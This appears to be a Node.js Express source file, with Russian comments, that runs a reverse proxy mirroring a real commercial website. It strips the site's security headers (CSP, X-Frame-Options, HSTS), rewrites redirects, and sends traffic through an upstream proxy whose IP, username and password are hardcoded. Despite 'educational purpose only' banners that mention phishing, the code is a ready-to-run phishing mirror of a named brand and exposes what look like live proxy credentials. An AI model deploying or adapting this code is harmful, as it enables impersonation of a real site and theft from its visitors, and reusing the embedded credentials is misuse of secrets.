const express = require('express');
const { createProxyMiddleware } = require('http-proxy-middleware');
const { HttpsProxyAgent } = require('https-proxy-agent');

const app = express();
const PORT = process.env.PORT || 3000;

// Целевой сайт для проксирования
const TARGET_URL = process.env.TARGET_URL || 'https://beyondchargers.com';

// Настройки прокси (если требуется)
const USE_PROXY = process.env.USE_PROXY === 'true' || process.env.PROXY_USER;
const PROXY_CONFIG = USE_PROXY ? {
  host: process.env.PROXY_HOST || '185.162.130.86',
  port: parseInt(process.env.PROXY_PORT || '10000'),
  auth: {
    username: process.env.PROXY_USER || 'UInVgOaurISMxHUOMkfD',
    password: process.env.PROXY_PASS || 'xnElmQSosaC9sekBD1SRzgqgBWcj2HsZ'
  }
} : null;

// Функция для создания прокси-конфигурации
const proxyOptions = {
  target: TARGET_URL,
  changeOrigin: true,
  secure: true,
  followRedirects: true,
  logLevel: 'debug',
  onProxyReq: (proxyReq, req, res) => {
    // Логирование запросов для образовательных целей
    console.log(`[PROXY] ${req.method} ${req.url} -> ${TARGET_URL}${req.url}`);
    
    // Удаляем заголовки, которые могут вызвать проблемы
    proxyReq.removeHeader('x-forwarded-host');
    proxyReq.removeHeader('x-forwarded-proto');
  },
  onProxyRes: (proxyRes, req, res) => {
    // Модификация ответов для корректной работы прокси
    if (proxyRes.headers['location']) {
      // Заменяем абсолютные URL на относительные
      const location = proxyRes.headers['location'];
      if (location.startsWith(TARGET_URL)) {
        proxyRes.headers['location'] = location.replace(TARGET_URL, '');
      }
    }
    
    // Удаляем заголовки безопасности, которые могут блокировать прокси
    delete proxyRes.headers['x-frame-options'];
    delete proxyRes.headers['content-security-policy'];
    delete proxyRes.headers['strict-transport-security'];
    
    // Добавляем заголовок для образовательных целей
    proxyRes.headers['x-proxy-demo'] = 'Educational Purpose Only';
  },
  onError: (err, req, res) => {
    console.error('[PROXY ERROR]', err);
    res.status(500).send('Proxy Error: ' + err.message);
  },
  // Если используется внешний прокси
  agent: PROXY_CONFIG ? new HttpsProxyAgent(
    `http://${PROXY_CONFIG.auth.username}:${PROXY_CONFIG.auth.password}@${PROXY_CONFIG.host}:${PROXY_CONFIG.port}`
  ) : undefined,
  // Дополнительные опции для прокси
  router: PROXY_CONFIG ? undefined : undefined
};

// Создаем прокси-мидлвар
const proxy = createProxyMiddleware(proxyOptions);

// Предупреждение на главной странице
app.get('/', (req, res) => {
  res.send(`
    <!DOCTYPE html>
    <html>
    <head>
      <title>Educational Reverse Proxy Demo</title>
      <style>
        body { font-family: Arial, sans-serif; max-width: 800px; margin: 50px auto; padding: 20px; }
        .warning { background: #fff3cd; border: 2px solid #ffc107; padding: 20px; border-radius: 5px; margin: 20px 0; }
        .info { background: #d1ecf1; border: 2px solid #0c5460; padding: 20px; border-radius: 5px; margin: 20px 0; }
        a { color: #007bff; text-decoration: none; }
        a:hover { text-decoration: underline; }
      </style>
    </head>
    <body>
      <h1>⚠️ Educational Reverse Proxy Demonstration</h1>
      
      <div class="warning">
        <h2>⚠️ IMPORTANT WARNING</h2>
        <p><strong>This is an educational demonstration for cybersecurity research purposes only.</strong></p>
        <ul>
          <li>This proxy is set up for academic research and education</li>
          <li>Use only in controlled, authorized environments</li>
          <li>Do not use for any malicious purposes</li>
          <li>All activities are logged for educational analysis</li>
        </ul>
      </div>
      
      <div class="info">
        <h3>📚 Educational Purpose</h3>
        <p>This demonstration is part of a university dissertation on cybersecurity.</p>
        <p>It is designed to help students understand:</p>
        <ul>
          <li>How reverse proxies work</li>
          <li>Security implications of proxy servers</li>
          <li>Methods used in phishing attacks (for defensive purposes)</li>
        </ul>
      </div>
      
      <h3>🔗 Access Proxied Site</h3>
      <p>To access the proxied content, click the link below or navigate to any path:</p>
      <p><a href="/?proxy=1" style="display: inline-block; padding: 10px 20px; background: #007bff; color: white; border-radius: 5px; margin: 10px 0;">Access Proxied Site →</a></p>
      <p><strong>Target URL:</strong> ${TARGET_URL}</p>
      
      <hr>
      <p><small>Created for educational purposes. Use responsibly and ethically.</small></p>
    </body>
    </html>
  `);
});

// Применяем прокси ко всем остальным маршрутам (кроме корня, где показываем предупреждение)
app.use((req, res, next) => {
  if (req.path === '/' && req.method === 'GET' && !req.query.proxy) {
    return next();
  }
  proxy(req, res, next);
});

// Обработка ошибок
app.use((err, req, res, next) => {
  console.error('Error:', err);
  res.status(500).json({ error: 'Internal Server Error', message: err.message });
});

app.listen(PORT, () => {
  console.log(`🚀 Educational Reverse Proxy Server running on port ${PORT}`);
  console.log(`📡 Proxying to: ${TARGET_URL}`);
  if (PROXY_CONFIG) {
    console.log(`🔐 Using proxy: ${PROXY_CONFIG.host}:${PROXY_CONFIG.port}`);
  }
  console.log(`⚠️  WARNING: This is for educational purposes only!`);
});

